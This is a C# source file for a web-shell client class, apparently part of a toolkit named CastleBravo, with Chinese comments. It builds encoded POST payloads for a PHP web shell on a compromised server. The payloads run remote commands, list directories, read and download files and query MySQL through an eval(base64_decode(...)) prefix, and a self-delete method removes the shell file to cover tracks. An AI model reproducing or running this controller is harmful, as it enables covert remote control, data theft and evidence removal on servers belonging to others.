using C2.Core;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace C2.Business.CastleBravo.WebShellTool
{
    class CommonClient : IClient
    {
        public string ShellSplitS;
        public string ShellSplitE;

        protected string passwd;
        protected string prefix;
        protected StringBuilder sb;
        protected ClientSetting clientSetting;
        protected string dbPrefix;

        public CommonClient(string password, string clientSetting)
        {
            this.clientSetting = ClientSetting.LoadSetting(clientSetting);
            this.passwd = password;
            this.prefix = password + "=" + this.clientSetting.PHP_MAKE + "&" + this.clientSetting.ACTION;
            this.dbPrefix = password + "=@eval(base64_decode($_POST[action])); &action"; //数据库连接用统一报文，先实现，后面再改
            this.sb = new StringBuilder();
            ShellSplitS = "[S]";
            ShellSplitE = "[E]";
        }

        public virtual string FetchLog()
        {
            string ret = sb.ToString(); sb.Clear(); return ret; 
        }

        public virtual string ExtractResponse(string response)
        {
            if (string.IsNullOrEmpty(response))
                return string.Empty;

            string spl = this.clientSetting.SPL;
            string spr = this.clientSetting.SPR;

            int splIndex = response.IndexOf(spl);
            //if (splIndex == -1) return string.Empty;
            if (splIndex == -1) return response;

            response = response.Substring(splIndex + spl.Length);

            int sprIndex = response.IndexOf(spr);
            if (sprIndex == -1) return string.Empty;

            return response.Remove(sprIndex);
        }

        public virtual string PHPIndex()
        {
            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INDEX);

            sb.AppendLine("定位D洞所在目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
              .AppendLine();

            return payload;
        }

        public virtual string PHPInfo()
        {
            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INFO);

            sb.AppendLine("phpinfo:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
              .AppendLine();

            return payload;
        }

        public virtual string PHPReadDict(string dict)
        {
            string payload = String.Format("{0}={1}&{2}={3}",
                prefix,
                clientSetting.PHP_READDICT,
                clientSetting.PARAM1,
                ST.EncodeUrlBase64(dict));

            sb.AppendLine("遍历目录:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(dict)))
              .AppendLine();

            return payload;
        }

        public virtual string PHPShell(string shellEnv, string command)
        {
            string payload = String.Format("{0}={1}&{2}={3}&{4}={5}",
                prefix,
                clientSetting.PHP_SHELL,
                clientSetting.PARAM1,
                ST.EncodeUrlBase64(shellEnv),
                clientSetting.PARAM2,
                ST.EncodeUrlBase64(command));

            sb.AppendLine("Remote Command:" + command)
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_SHELL)))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(shellEnv)))
              .AppendLine(string.Format("参数二:{0}", ST.SuperDecodeBase64(command)))
              .AppendLine();

            return payload;
        }
        public virtual string GetDatabaseInfo(string loginInfo ,string database ,string command) 
        {
            string payload = String.Format("{0}={1}&z1={2}&z2={3}&z3={4}",
                   dbPrefix,
                   ST.EncodeUrlBase64(clientSetting.PHP_DB_MYSQL),
                   loginInfo,
                   database,
                   ST.EncodeUrlBase64(command));

            sb.AppendLine("Remote Command:" + command)
             .AppendLine(payload)
             .AppendLine(string.Format("引导段:{0}", dbPrefix))
             .AppendLine(string.Format("攻击段:{0}", clientSetting.PHP_DB_MYSQL))
             .AppendLine(string.Format("参数一:{0}", loginInfo))
             .AppendLine(string.Format("参数二:{0}", database))
             .AppendLine(string.Format("参数三:{0}", command))
             .AppendLine();
            return payload;
        }
        public virtual IClient AppendLog(string msg)
        {
            sb.Append(msg); return this;
        }

        public Tuple<string, string> GetShellParams()
        {
            return Tuple.Create(ShellSplitS, ShellSplitE);
        }

        public string Suscide()
        {
            return passwd + "=" + "print(unlink($_SERVER%5BSCRIPT_FILENAME%5D));";
        }
    
       
        public virtual string DetailInfo(string pageData)
        {
            string payload = String.Format("{0}={1}&{2}={3}",
                 prefix,
                 clientSetting.PHP_READFILE,
                 clientSetting.PARAM1,
                 ST.EncodeUrlBase64(pageData));

            sb.AppendLine("文件浏览:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(pageData)))
              .AppendLine();

            return payload;
        }

        public virtual string DownloadFile(string pageData) 
        {
            string payload = String.Format("{0}={1}&{2}={3}",
                  prefix,
                  clientSetting.PHP_DOWNLOAD,
                  clientSetting.PARAM1,
                  ST.EncodeUrlBase64(pageData));

            sb.AppendLine("文件下载:")
              .AppendLine(payload)
              .AppendLine(string.Format("引导段:{0}", prefix))
              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(pageData)))
              .AppendLine();

            return payload;
        }

        public virtual List<string> ParseCurrentPath(string data)
        {   // take会自动处理越界问题
            return data.Split('\t').Take(2).ToList();
        }
    }
}
